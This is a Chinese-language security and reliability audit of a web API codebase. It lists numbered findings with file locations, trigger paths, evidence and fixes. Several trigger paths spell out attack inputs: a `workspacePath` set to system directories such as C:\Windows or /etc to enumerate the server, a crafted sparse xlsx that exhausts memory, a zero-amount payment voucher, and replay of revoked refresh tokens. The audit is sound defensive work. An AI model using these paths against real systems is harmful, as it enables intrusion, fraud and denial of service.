- **证据**：`:342-353` `const v = await redis.incr(...); if (v>cap) {decr; return null}; await redis.pexpire(...)`；`:368-374` catch 后内存 +1。
- **影响面**：一次失败即双占坑，归还只减内存 → Redis 计数永久偏高，全局并发上限被蚕食；键可能无 TTL。
- **建议修法**：Lua/MULTI 原子化 INCR+PEXPIRE；或 pexpire 失败先 decr 回滚。
- **是否当场可修**：是。

### F-241 组邀请码「一次性」未原子占用，并发可被多把 Key 同时兑换

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/api-key-group-service.ts:254,285-313`
- **触发路径**：两把不同 API Key 同时 `POST /api-key-groups/join {inviteCode}` → 均在事务外读到 `used=false` → 各自插入成员并置 `used=true`。
- **根因**：check-then-act；`api_key_group_members` 唯一约束在 `api_key_id` 上，拦不住同一邀请码给多把 Key；更新无 `used=false` 条件。
- **证据**：`:292-294` 事务外判 `invite.used`；`:305-313` `insert member` + `update invites set used=true where id=?`。
- **影响面**：一次 8 位邀请可把任意数量 Key 拉进同组，共享组池余额/额度；`usedBy` 只记最后一个。
- **建议修法**：事务内 `UPDATE ... SET used=true WHERE invite_code=? AND used=false AND expires_at>now() RETURNING group_id`，rowCount!==1 即拒绝。
- **是否当场可修**：是。

### F-242 每个转发请求全量查一次参数覆盖规则表，无缓存

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/relay-param-ops-config.ts:152-157,268-272`；调用点 `routes/v1-public.ts:770,939,1848,1916`、`v1-messages.ts:497`、`v1-responses.ts:549`
- **触发路径**：任意 `/v1/chat/completions|messages|responses` 请求 → `applyParamOpsToBody` → `listParamOpRules()` 全量 select + 逐行 JSON.parse。
- **根因**：低频变更的配置数据无任何进程内缓存，读路径直接落 `dbRead`。
- **证据**：`:152-157` `await dbRead.select().from(systemConfigs).where(eq(category, PARAM_OPS_CATEGORY))`。
- **影响面**：单实例 QPS 被配置表查询线性放大，与计费/鉴权查询争池。
- **建议修法**：模块级 30~60s TTL 缓存 + CRUD 后失效；无规则短路。
- **是否当场可修**：是。

### F-243 队列隔离只看库名关键词，非主库但名字不含特征时仍抢主库队列

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/relay-queue-name.ts:33,36-37,122-126`
- **触发路径**：`DATABASE_URL` 指向 `ihui_staging/preview/backup/local` 等非主库且不含 `e2e|test|ci|tmp|perf|sandbox|scratch` → 规则 3 返回原名 → 消费主库队列。
- **根因**：规则 3「原名」同时承担「主库」与「未命中关键词的独立非主库」，无法区分。
- **证据**：`:122` `if (dbName !== primaryDbName && ISOLATED_DB_PATTERN.test(dbName)) { ... isolated:true }`；`:126` 其余 `return { queue: base, isolated: false, reason: 'primary' }`。
- **影响面**：隔离/预发栈静默接管主库定时作业（号池保活/对账），主库侧任务失败或被错误执行。
- **建议修法**：默认「非主库即隔离」，仅白名单库名走原名；或要求显式 `RELAY_DB_ROLE=primary`。
- **是否当场可修**：是。

### 第九轮 E：db 剩余查询层

### F-244 OAuth 授权码「先查后标记」非原子，同一 code 并发换出两套 token

- **严重度**：P1
- **文件与行号**：`apps/api/src/db/oauth-queries.ts:144-151`；调用点 `apps/api/src/routes/auth-extended.ts:2373,2380-2393`
- **触发路径**：同一 `code` 并发两次 `POST /api/auth/oauth/web/token`（同 client + PKCE verifier）。
- **根因**：一次性消费在应用层「读 → 判 `isUsed` → 写」，写入不带 `is_used=false` 条件，两请求都能通过判空。
- **证据**：`auth-extended.ts:2380-2393` `findSessionByCode` → 判 `session.isUsed` → `markSessionUsed`；`oauth-queries.ts:149-151` `update(oauthSessions).set({isUsed:true}).where(eq(code, code))`。
- **影响面**：一次性授权码语义被破坏，同一 code 产出两组 access/refresh token（两个 refresh family）。
- **建议修法**：条件更新 `UPDATE ... SET is_used=true WHERE code=$1 AND is_used=false AND expires_at>now() RETURNING user_id`，0 行即 400。
- **是否当场可修**：是。

### F-245 `/api/admin/usercenter/*` 整行返回用户对象（含 `twoFactorSecret`/`twoFactorBackupCodes`），仅剥 `passwordHash`

- **严重度**：P1
- **文件与行号**：`apps/api/src/db/usercenter-queries.ts:45-61`；`apps/api/src/routes/usercenter.ts:119,154,182,206-207`；`apps/api/src/db/queries.ts:37-48`；`packages/database/src/schema/users.ts:78-80`
- **触发路径**：管理员 `GET /api/admin/usercenter/users`、`.../users/by-phone`、`.../users/:id`。
- **根因**：查询层 `select({ user: users })` 取全列；路由层黑名单只摘 `passwordHash`，且 `onRequest` 关闭响应脱敏。
- **证据**：`usercenter-queries.ts:45-49` `select({ user: users, departmentName })`；`usercenter.ts:119` `skipResponseSanitization = true`；`usercenter.ts:154` `.map(({ passwordHash: _ph, ...rest }) => rest)`；`users.ts:78-80` 存在 `twoFactorSecret`/`twoFactorBackupCodes`。
- **影响面**：有后台只读权限的运营/客服可批量导出全体用户 2FA 材料（密文与备用码哈希），构成 2FA 绕过面；phone/email 也无兜底脱敏。
- **建议修法**：查询改显式投影，彻底不选 `two_factor_*`；移除 `skipResponseSanitization` 或改字段级 redact。
- **是否当场可修**：是。

### F-246 审计链查询异常被吞成空结果，`/audit-logs`、导出与 SIEM 静默截断

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/audit-queries.ts:184-189,240-254,256-269,271-311`；`apps/api/src/services/siem-exporter.ts:204-219`；`apps/api/src/services/audit-log-service.ts:252`
- **触发路径**：`audit_logs_chain` 未迁移/权限不足/连接抖动时任一查询报错。
- **根因**：catch 只 warn 并返回 `{list:[],total:0}`；导出侧把空页当无数据 `break`，HTTP 仍 200。
- **证据**：`audit-queries.ts:184-189` `catch (e) { logger.warn(...); return { list: [], total: 0 } }`；`siem-exporter.ts:210-211` `if (list.length === 0) break`。
- **影响面**：审计员无法区分「无记录」与「查询失败」；合规导出/SIEM 静默截断，取证数据丢失且无 5xx。
- **建议修法**：区分表未就绪（可降级）与查询失败（抛错 → 500 + 告警）；导出遇错中止并返回 5xx。
- **是否当场可修**：是。

### F-247 客服派单 TOCTOU：判 `waiting` 后按 sessionId 无条件更新，负载自增在事务外

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/customer-service-queries.ts:402-408,453-473`；调用点 `apps/api/src/plugins/ws-customer-service.ts:153-179`
- **触发路径**：两名坐席几乎同时上线（或上线与消息触发并发），两次 `dispatchQueue` 对同一 waiting 会话各跑一遍。
- **根因**：`assignSession` 先判 `status==='waiting'`，再 `UPDATE ... WHERE sessionId=?` 不带状态条件；`adjustAgentLoad(+1)` 独立语句无事务；`findWaitingSessions` 无 `FOR UPDATE`/无 LIMIT。
- **证据**：`:453-473` `const existing = await findSessionBySessionId(...); if (existing.status !== 'waiting') return { reason:'not_waiting' }; await db.update(...).set({agentId,status:'active'}).where(eq(sessionId))`；`await adjustAgentLoad(agentId, 1)`。
- **影响面**：同一会话被两坐席各认领，后写覆盖 agentId，前一坐席负载 +1 永久泄漏 → 超 maxConcurrent 接单。
- **建议修法**：`UPDATE ... WHERE sessionId=$2 AND status='waiting' RETURNING *`，命中后同事务内 +1。
- **是否当场可修**：是。

### F-248 取消 VIP 只改 `user_vips.status`，不回写 `users.isVip`，被取消用户仍享 VIP 权益

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/vip-queries.ts:138-141`（对比开通 `:119-120`）；调用点 `apps/api/src/routes/vip.ts:497-501`
- **触发路径**：运营 `PUT /api/admin/vip/users/:id/cancel`。
- **根因**：取消只更新 `user_vips`，`users.isVip` 保留开通时的值；路由返回常量 `cancelled:true`，0 行变更不可见。
- **证据**：`vip-queries.ts:138-141` `update(userVips).set({status:2}).where(eq(id))`；`vip.ts:499-500` `await cancelUserVip(id); return success({cancelled:true})`。
- **影响面**：`agent-service.ts:177`、`token-balance-service.ts:107-113`、`commission-queries.ts:683,749` 仍按 `users.isVip` 生效；与 `getMyVip`（过滤 status=1）显示矛盾。
- **建议修法**：事务内查该用户其它有效 VIP，无则 `users.isVip=0`；返回实际命中数。
- **是否当场可修**：是。

### F-249 `closeSession` 无幂等保护，重复关闭重复递减坐席负载

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/customer-service-queries.ts:475-485`；调用点 `apps/api/src/plugins/ws-customer-service.ts:385-393`
- **触发路径**：客户断开 → 重连 → 再断开；或坐席端断开与后台关闭几乎同时。
- **根因**：`UPDATE ... WHERE sessionId=?` 不判当前状态；只要历史行有 `agentId` 就 `-1`，第二次调用对已 closed 行仍再递减；`endedAt` 被覆盖。
- **证据**：`:478-485` `const existing = await findSessionBySessionId(...); ... if (existing?.agentId) await adjustAgentLoad(existing.agentId, -1)`。
- **影响面**：`currentLoad` 反复递减至 0，坐席被误判空载而超量派单；会话时长统计失真。
- **建议修法**：`UPDATE ... WHERE session_id=$1 AND status <> 'closed' RETURNING agent_id`，仅返回行存在时递减。
- **是否当场可修**：是。

### F-250 AI 世界列表 `count` 只按标题匹配、列表按「标题 OR 摘要」，搜索时 total 与列表不一致

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/ai-world-queries.ts:67-73,105-109`；调用点 `apps/api/src/routes/ai-world.ts:124,145,171,187,216`
- **触发路径**：搜索词只出现在 `summary` 时，`GET /api/ai-world/{tools,apps,news,papers,projects}?search=`。
- **根因**：list 用 `title ILIKE ? OR summary ILIKE ?`，count 只用 `ilike(title, ?)`。
- **证据**：`:70-72` 双条件；`:108` `conditions.push(ilike(aiWorldItems.title, escapedSearch))`。
- **影响面**：`total` 偏小，前端分页器少页/提前「没有更多」；`total=0` 但列表有数据。
- **建议修法**：抽出共享 search 条件构造函数，list/count 复用。
- **是否当场可修**：是。

### F-251 AI 世界详情/分类公开接口未过滤 `status=1`，下线条目仍可读并累加浏览

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/ai-world-queries.ts:30-39,41-44`；调用点 `apps/api/src/routes/ai-world.ts:222-230`；schema `packages/database/src/schema/ai-world-items.ts:78`
- **触发路径**：拿到条目 UUID 后 `GET /api/ai-world/items/:id`（无 preHandler，公开），条目已 `status=0` 下架。
- **根因**：详情与分类查询只按主键/slug，未带 `status=1`；列表查询带 `status=1`。
- **证据**：`ai-world-queries.ts:41-44` `select().from(aiWorldItems).where(eq(id, id)).limit(1)`；`:58` 列表带 status。
- **影响面**：内容下架/审核隔离被绕过，违规内容仍公开并可写 `view_count`。
- **建议修法**：详情与分类查询增加 `eq(status, 1)`；后台另开带 `requireAdmin` 的管理查询。
- **是否当场可修**：是。

## 十四、第十轮新增（services 智能体AI / 文档教育上传 / 账号认证风控 / routes 剩余 / utils 剩余）

> 本轮 5 路并行，共 40 条。已复核关键 P1：`xlsx-parser.ts:168-181` 以 `rowCount×columnCount` 双重循环、`refresh-replay-policy.ts:60-65` `stale-sibling` 放行、`purge-user-pii.ts:62-102` 表清单缺 5 张、`logger.ts:61` 跳过 `err` 打码、`v1-midjourney.ts:206-214` 缺 `requireApiKeyQuota`。

### 第十轮 A：services 智能体 / AI 核心

### F-252 自动化调度对 ai-service SSE 无总超时/无 Abort，一条挂起即全调度停摆并在租约超龄后双跑

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/agent-automation-scheduler.ts:429-449,825-835,894-919,999-1029`；`apps/api/src/utils/ai-service-fetch.ts:63-118`；`apps/api/src/services/automations/index.ts:66-70`
- **触发路径**：`/api/agent-runtime/execute/stream` 返回 200 后上游挂起 → `reader.read()` 永不返回 → `executeAutomation` 不结束 → `busy` 不复位。
- **根因**：`aiServiceFetch` 裸 `fetch` 无 `signal`/timeout；消费侧无限 `for(;;) await reader.read()`；`runAutomationTick` 串行 await；单飞 `busy` 只在 run 结束复位。
- **证据**：`ai-service-fetch.ts:114` `return fetch(url, {...init, headers})`；`agent-automation-scheduler.ts:435-437` 无限读循环；`automations/index.ts:66-70` `if (busy) { replayRequested = true; return }`。
- **影响面**：单条上游挂起即全部定时自动化停止；15 分钟认领租约到期后其他实例可认领同一行 → 双跑双计费；socket 悬挂。
- **建议修法**：AbortController + 总 deadline + 空闲超时（120s 无 chunk 即 abort），`reader.cancel()` 收尾。
- **是否当场可修**：是。

### F-253 SSE 已收到内容后断流/收到 `data.message` 仍按成功结算，attempt 归零且不重试

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/agent-automation-scheduler.ts:429-431,447-449,825-835,894-919`
- **触发路径**：上游 200 后连接中断或流内 `data.message` 错误帧，此前已收到 `data.content`。
- **根因**：只有非 2xx 才写 `upstreamStatus`；流内错误/读异常只写 `errorMessage`；成功分支仅判 `upstreamStatus !== null`，摘要优先取 `contentTail`。
- **证据**：`:429-431` `capture.errorMessage = data.message`；`:447-449` catch 写 errorMessage；`:825` `if (capture.upstreamStatus !== null) return settleFailure(...)`；`:903-907` `attempt: 0, lastError: null`。
- **影响面**：transient 故障记成功、用户看到「执行完成」、不重试、成功率与成本统计失真。
- **建议修法**：capture 增加结构化 `failed/streamAborted`；读异常/`event:error`/`data.message` 统一走 `settleFailure`；摘要 error 优先于 contentTail。
- **是否当场可修**：是。

### F-254 `/api/context/mentions` 接受任意绝对 `workspacePath`，可枚举服务器目录并同步阻塞事件循环

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/context-engine-service.ts:316-318,441-471,474-501`；`apps/api/src/routes/context-mentions.ts:29-33,130-147`
- **触发路径**：登录用户 `GET /api/context/mentions?type=folder&workspacePath=C:\Windows`（Linux `/etc`）。
- **根因**：`workspacePath` 仅 `max(512)`，未与用户 workspace 绑定、未 realpath 收敛；`scanFolders` 用 `readdirSync/statSync` 递归 2 层收集全部再 `slice`。
- **证据**：`context-mentions.ts:31` schema；`context-engine-service.ts:451` `scanFolders(workspacePath, 2)`；`:480` `readdirSync`；`:489` `statSync`；`:458` 先全量后截断。
- **影响面**：泄漏服务器绝对路径与目录结构；同步递归阻塞事件循环可放大为 DoS。
- **建议修法**：拒绝绝对路径与 `..`，realpath 必须落在用户 workspace 根；改异步 `opendir` 边扫边截断（条数/耗时双上限）。
- **是否当场可修**：是。

### F-255 Subagent `runtimes` Map 只增不减：内存无界 + 每次派单 O(N) 扫描 + 重启后统计归零

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subagent-dispatch-service.ts:534-554,1492,2360-2362,2547,3314-3321`
- **触发路径**：每次派单写入 `runtimes`，终态后无删除。
- **根因**：`runtimes` 同时当在途状态与历史缓存，无终态回收/TTL；容量判据对全量 filter；元素含 steps/logs/checkpoints/messages。
- **证据**：`:1492` `private runtimes = new Map()`；`:2547` `runtimes.set(...)`；`:2360-2362` 全量 filter；`:3314` 注释自述只增不减。
- **影响面**：常驻内存单调增长可 OOM；每次派单 O(N)；重启后历史详情 404、看板数据清零。
- **建议修法**：终态持久化后删除，另建有界 LRU；容量用独立 inFlight 计数；`findById` 回退 DB/Redis。
- **是否当场可修**：是。

### F-256 urgent 抢占只改状态不中止执行：槽位释放但任务仍在跑，并发可破上限且 `preempted` 被覆写 `completed`

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subagent-dispatch-service.ts:2353-2368,2604-2624,2664,2792-2799`
- **触发路径**：租户并发打满时提交 `priority:'urgent'` → `_tryPreempt` 把 low/normal 置 `preempted` → `_capacityBlocked` 视为已释放 → 新单开跑；被抢占任务无 abort，成功后写回 `completed`。
- **根因**：抢占只写状态无 AbortSignal；容量按 `dispatch.status` 计数（`preempted` 不算 active）；`runDispatch` 完成回写无状态守卫。
- **证据**：`:2613-2616` 只改 status + `void persist`；`:2360-2361` 按 `isActiveDispatchStatus` 计数；`:2664`/`:2792` 无条件覆盖。
- **影响面**：实际并发突破全局/租户/优先级上限，token 双耗；状态反复跳变。
- **建议修法**：抢占记录 AbortController 并 abort；回写前判 `cancelled/preempted` 跳过；容量改按 inFlight 集合。
- **是否当场可修**：部分（先加回写守卫）。

### F-257 对公打款凭证金额由客户端自填且确认时不校验，0/1 分凭证经确认即整单履约

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-enterprise-service.ts:478-511,520-539`；`apps/api/src/routes/relay-enterprise.ts:58-61`
- **触发路径**：`POST /api/developer/enterprise/corporate-payments {orderNo, amountCents:0}` → 管理员确认 → `completeOrder(orderNo)` 按原价标记 paid 并充值。
- **根因**：`amountCents` 取客户端值（`min(0)`），未与 `order.amount` 对齐；确认只判凭证/订单 status。
- **证据**：`relay-enterprise.ts:60` schema；`relay-enterprise-service.ts:505` `amountCents: input.amountCents ?? order.amount`；`:531-539` 直接 `completeOrder`。
- **影响面**：低于订单金额（含 0）的凭证被确认即完成整单支付，资金损失；对账失真。
- **建议修法**：入库/确认强制等于 `order.amount`（或按财务规则 `>=`），不符拒绝并记录。
- **是否当场可修**：是。

### F-258 超级智能体快照 `saveIfDirty` 先清脏再落库，单次失败后不再重试

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/super-agent-pump-service.ts:54-84,301`
- **触发路径**：DB `upsertUserPreference` 失败且之后无新 `onDirty`。
- **根因**：`dirty=false` 在 `doSave` 之前；catch 只置 degraded 不恢复 dirty；`onCycle` 因 dirty=false 直接 return。
- **证据**：`:71-75` 先清脏；`:76-83` catch 仅记录；`:301` `onCycle: () => saveIfDirty()`。
- **影响面**：失败批次不重试，重启丢最后一批状态；健康读数长期 degraded 不自愈。
- **建议修法**：失败恢复 `dirty=true` 并退避重排；或成功后才清 dirty。
- **是否当场可修**：是。

### F-259 幂等键超 200 字符被静默截断，不同长键撞同一槽位导致错误回放/409

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/run-idempotency.ts:85,136-144,214-232,575-590`
- **触发路径**：两个不同但前 200 字符相同的 `Idempotency-Key` 先后请求。
- **根因**：`readIdempotencyKey` 超长 `slice(0,200)`，未拒绝也未标记；`slotKeyOf` 用截断值拼键。
- **证据**：`:85` `MAX_CLIENT_KEY_LEN=200`；`:142-143` `return trimmed.slice(0, MAX)`；`:222` 使用截断值。
- **影响面**：不同逻辑请求被当同一请求，回放第一次资源或 409，且无告警。
- **建议修法**：超长直接 400；或对完整键 SHA-256 定长化。
- **是否当场可修**：是。

### 第十轮 B：services 文档 / 教育 / 上传

### F-260 `xlsx-parser` 以 `rowCount×columnCount` 双重循环，一个 2KB 稀疏表即可打死主线程

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/xlsx-parser.ts:168-181,185-201,352-368`；入口 `apps/api/src/services/document-parser.ts:223,287-289`；调用 `apps/api/src/services/knowledge-rag-service.ts:314`
- **触发路径**：向知识库上传含 `<row r="1048576"><c r="XFD1048576">` 的 xlsx → `parseDocument`（20MB 闸通过）→ `parseXlsx` → `exceljsWorksheetToMatrix`。
- **根因**：直接以 `ws.rowCount`/`ws.columnCount` 双重循环，未设坐标上限；二者是坐标极值而非有值区域；本文件无 `MAX_SHEET_CELLS` 类闸。
- **证据**：`:168-181` `for (let r=1; r<=rowCount; r++) { const excelRow = ws.getRow(r); for (let c=1; c<=colCount; c++) { excelRow.getCell(c) } }`。
- **影响面**：约 1.7e10 次对象分配，主线程卡死至 OOM；所有 RAG 入库接口受影响。
- **建议修法**：解析前断言行列上限（如各 ≤2000、总格 ≤20 万）；改 `ws.eachRow({includeEmpty:false})`；加解析超时/子进程隔离。
- **是否当场可修**：是。

### F-261 `diff-service` 的 LCS 是 `(m+1)×(n+1)` 二维数组且无上限，两 5MB 文本即 OOM；文本采样实际整文件读入

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/diff-service.ts:38-47,69-86,113-129,167-172,175-198`；入口 `apps/api/src/routes/file-version.ts:400-401`
- **触发路径**：`GET /file-versions/:fileId/compare?v1=&v2=`（`checkAuth`+`canAccessFile`）→ 同一对文件读 4 遍、跑 2 次 LCS。
- **根因**：`isTextFile` 注释称采样 8KB，实际 `readFileSync(filePath)` 全量读再 `subarray`；LCS 无行数/字节上限；调用方又完整读一遍。
- **证据**：`:40` `readFileSync(filePath, {encoding:null})`；`:175-180` `Array.from({length:m+1}, () => new Array(n+1).fill(0))`。
- **影响面**：两 5MB txt（约 10 万行）→ 1e10 槽 OOM；4 次同步读阻塞事件循环；普通用户可复现。
- **建议修法**：任一侧 >2MB 或 >5000 行直接拒绝；LCS 改 Myers/Hunt–Szymanski 或分块；`isTextFile` 改 `openSync`+`readSync(0,8192)`；复用已读内容。
- **是否当场可修**：是。

### F-262 `heat-stats-hourly` 每小时重复累加当日全量 hit，`agents.usage_count` 逐日膨胀

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/heat-stats-service.ts:34-52,65-79`；调度 `apps/api/src/plugins/scheduler.ts:93`、`apps/api/src/workers/scheduler-worker.ts:339-340`
- **触发路径**：`heat-stats-hourly`（`0 * * * *`）→ `aggregateHeatStats()` → `syncAgentUsageCount(dateStr)`。
- **根因**：SQL 为 `usage_count = usage_count + 当日 hit 总和`，每小时跑一次当日全量，无水位数；`dateStr = new Date().toISOString().slice(0,10)` 用 UTC。
- **证据**：`:34-52` UPDATE 子查询按 `dateStr` 求和；`:65-79` 每次全量；`totalHits` 用 `sum(...)::bigint::int`。
- **影响面**：日终 `usage_count` 约为真实值「累计小时数」倍，排行榜/配额/看板失真；日量 >2^31 时任务 500。
- **建议修法**：改按日一次性同步或用水位增量；日期用 `bizDayKey`；去掉 `::int`。
- **是否当场可修**：是（需补口径修复脚本）。

### F-263 考勤判定用进程本地时区取 HH:MM，UTC 容器下迟到/早退整体偏移 8 小时

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/edu-attendance-rule.ts:53-60,75-83`；调用 `apps/api/src/routes/edu-ai-management-attendance-helpers.ts:122-127,342-347,463-468`
- **触发路径**：学生签到 → `new Date()` → `judgeStatus` → `hmOfLocalDate` → `getHours()/getMinutes()`。
- **根因**：阈值语义是北京墙钟，但取进程本地时区；镜像未设 `TZ`，默认 UTC；同文件日终任务改用 `Intl` 显式时区，两把尺子。
- **证据**：`:53-60` `String(d.getHours()).padStart(2,'0')`；对照 `edu-attendance-absent-job.ts:188-193` 用 `Intl.DateTimeFormat(..., {timeZone: BIZ_TIMEZONE})`。
- **影响面**：UTC 下北京 09:10 算出 01:10 永不判迟到，17:00 签退算出 09:00 全员误判早退；出勤率/奖学金/毕业资格被污染。
- **建议修法**：`hmOfLocalDate` 改 `Intl.DateTimeFormat('en-GB',{timeZone:BIZ_TIMEZONE,hour:'2-digit',minute:'2-digit',hourCycle:'h23'})`。
- **是否当场可修**：是。

### F-264 `reindexAll` 先删索引再建，bulk 失败无回滚，留下空/半量索引

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/search-es-service.ts:343-367,370-406`；入口 `apps/api/src/routes/search.ts:497`
- **触发路径**：`POST /search/reindex` → `indices.delete` → `indices.create` → 分批灌数据 → bulk `errors` 抛错。
- **根因**：无临时索引/别名切换；分页 `orderBy(createdAt).limit().offset()` 无唯一 tie-break。
- **证据**：`:343-346` delete 后 create；`:400-402` `if (bulkResp?.errors) throw`。
- **影响面**：一次失败即空/半量索引，搜索静默回退 PG，排序/高亮/分页漂移，需人工重跑。
- **建议修法**：写临时索引 + 完成后 alias 原子切换；分页改 keyset `(createdAt,id)`。
- **是否当场可修**：是。

### F-265 workbook 会话 `touched` 无上限且 `affectedFormulaCells` 双层全量比较，单请求可阻塞数秒到分钟

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/workbook-service.ts:52-54,450-462,714-718`；入口 `apps/api/src/routes/workbook.ts:134`
- **触发路径**：同一 handle 反复 `POST /workbook/write`，`touched` 随会话累积。
- **根因**：`touched` 与会话同寿命无上限；`affectedFormulaCells` 为 `formulaCells × touched` 全量比较；`MAX_WRITE_CELLS` 只限单批。
- **证据**：`:455-462` `s.touched.push(...)` 后 `recalcView(s)`；`:714-718` 双层 for。
- **影响面**：2 万公式格 + 20 万 touched → 4e9 次比较，单请求阻塞；攻击者可构造。
- **建议修法**：`touched` 改 Set 去重 + 上限；只与本批新增比对（增量）。
- **是否当场可修**：是。

### F-266 合并隔离 hash 只有 HSET/HGETALL，无 HDEL/EXPIRE，Redis 单调增长且读侧全量传输

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/upload-merge-redis-semaphore.ts:146-159,230-246`；写入 `apps/api/src/services/upload-merge-gate.ts:604-640,703-723`
- **触发路径**：任一次分片合并 `stop-failed` 或释放失败 → `quarantine(slotToken, payload)`；接管方 `HGETALL`。
- **根因**：隔离 hash 无删除、无 TTL；字段名每次占用带自增后缀唯一；收口成功不删。
- **证据**：`:146-159` 只有 `HSET`；`:230-246` 只有 `HGETALL`。
- **影响面**：每次失败永久留 JSON，长跑实例单调增长；`HGETALL` 全量传输形成正反馈；可主动放大。
- **建议修法**：收口后 `HDEL`；zset 记时间定期清理；读侧 `HSCAN COUNT`。
- **是否当场可修**：是。

### F-267 自愈「依赖修复」命令 `pnpm` 命中管理员专用闸，100% 以 exitCode 126 失败

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/self-healing.ts:252-276`；闸门 `apps/api/src/services/workspace-ai-service.ts:973-978`
- **触发路径**：`self_heal_detect` 报 `dependency` → `self_heal_repair` → `repairDependency` → `sandboxExecutor.execute({command:'pnpm install --no-frozen-lockfile'})`。
- **根因**：`pnpm` 在 `SANDBOX_INTERPRETER_BINARIES` 中被 `!params.isAdmin` 拒绝，而 `repairDependency` 不传 `isAdmin`。
- **证据**：`:252-276` 调用未传 isAdmin；`workspace-ai-service.ts:973-978` `if (SANDBOX_INTERPRETER_BINARIES.has(binary) && !params.isAdmin) return {exitCode:126,...}`。
- **影响面**：最常见自愈场景 100% 失败，用户看到含 126 的失败步骤；功能级不可用。
- **建议修法**：为自愈单独开受控通道（固定 argv + `--ignore-scripts` + 归属校验），或前置提示「需管理员」。
- **是否当场可修**：否（涉及权限模型）。

### 第十轮 C：services 账号 / 认证 / 风控

### F-268 refresh token 重放检测被 `stale-sibling` 永久绕过，旧 refresh token 可无限续期

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/refresh-replay-policy.ts:56-70`；调用面 `apps/api/src/routes/auth.ts:1474-1520,1532-1544`
- **触发路径**：攻击者取得已轮转吊销的 refresh token → `POST /api/auth/refresh`，吊销 >30s 且同 family 有活 token → 裁决 `stale-sibling` → 继续轮转并签发同 family 新 token。
- **根因**：`stale-sibling` 把「family 内还有活 token」当合法用户；攻击者首次重放成功后其新 token 即活 sibling，后续永远命中该分支，`reuse`（整族吊销）不可达。
- **证据**：`:60-65` `const liveSibling = await findLiveFamilyToken(familyId); if (liveSibling) return { verdict:'stale-sibling', ... }`；`auth.ts:1536` 仍 `buildTokenPair({..., familyId})`。
- **影响面**：任何一次 refresh token 泄漏即可长期续期，会话劫持；重用检测失效。
- **建议修法**：`race` 之外一律判 `reuse` 并吊销整族；或引入 `(familyId, generation)` + `replacedBy` 链。
- **是否当场可修**：是（需产品确认多端行为）。

### F-269 注销擦除漏删 user_emails / security_logs / devices 等 5 表，gender/birthday 未清，单表失败静默

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/purge-user-pii.ts:62-102,115-121,136-155`；触发 `apps/api/src/routes/gdpr.ts:159-191`；表定义 `packages/database/src/schema/{users,security-logs,devices}.ts`
- **触发路径**：`POST /api/gdpr/erase` → `purgeUserPii(userId)` → 固定表清单 + UPDATE users → 固定返回 `{erased:true}`。
- **根因**：表清单未覆盖后建表 `user_emails`/`security_logs`/`devices`/`device_pair_codes`/`device_tasks`；users 只 UPDATE 不 DELETE，级联不触发；匿名化漏 `gender/birthday`；单表 delete 失败 catch 仅 warn 仍算成功。
- **证据**：`:62-102` 表清单；`:115-121` catch warn；`:136-155` SET 无 gender/birthday。
- **影响面**：注销后明文邮箱残留且唯一约束挡住重新注册；设备指纹/登录 IP/UA 仍关联；假删除不合规。
- **建议修法**：补齐 5 表；SET 增 `gender:0, birthday:null`；整体事务，失败回滚并返回明细。
- **是否当场可修**：是。

### F-270 Coze access_token 全局单槽缓存不区分 userUuid，scope 被静默丢弃

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/coze-auth-utils.ts:30-31,98-110,141-143`；`apps/api/src/services/coze-oauth-apps.ts:303-317`；`apps/api/src/routes/coze-oauth.ts:87-100,200-212,302-318`
- **触发路径**：管理员先以 `user_uuid=A` 获取 token 写入单槽缓存，随后以 `user_uuid=B` 请求命中缓存返回 A 的 token。
- **根因**：模块级 `{token, expireTime}` 键不含 userUuid/scope/clientId；`scope` 未传入 `getCozeAccessToken`。
- **证据**：`:30-31` 单槽；`:98-110` 命中即返回；`coze-oauth-apps.ts:303-317` 只传 userUuid。
- **影响面**：A 的主体 token 被当 B 返回；应用级全平台 token 被用户级请求复用，越权/身份错配；最小 scope 实际拿到全量。
- **建议修法**：缓存键 `clientId|userUuid??'app'|scope??''`；`getCozeAccessToken` 加 scope；`expires_in` 用真实 TTL。
- **是否当场可修**：是。

### F-271 企微 suite 登录绑定只取 open_userid、丢弃 corpId，缺租户维度

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/oauth-providers.ts:406-422`；`apps/api/src/routes/auth-extended.ts:1574-1582,3149-3151`；`apps/api/src/db/oauth-queries.ts:227-237`
- **触发路径**：企微扫码登录 → `wecomCode2session` 返回 `{userid, open_userid, corpid}` → 路由用 `openUserId` 查绑定。
- **根因**：绑定键只有 `(platform, open_id)`，corpId 未参与查询/唯一索引；`open_userid` 命名空间是企业内。
- **证据**：`oauth-providers.ts:406-422` 返回 corpId；`auth-extended.ts:1580` `findThirdPartyAccount('enterpriseWechat', session.openUserId)`。
- **影响面**：多企业接入时 B 企业同值 open_userid 可登录 A 的本地账号，跨租户接管。
- **建议修法**：绑定键改 `platform|corpId|openUserId`；登录校验 corpId 白名单；存量回填。
- **是否当场可修**：是（需迁移）。

### F-272 2FA step-up 未做 TOTP 一次性兑付，同一 6 位码可在窗口内重复刷新 step-up

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/auth-extended.ts:3703-3709`（对比 `:3844-3851`）；`apps/api/src/services/two-factor-step-up-store.ts:78-119`
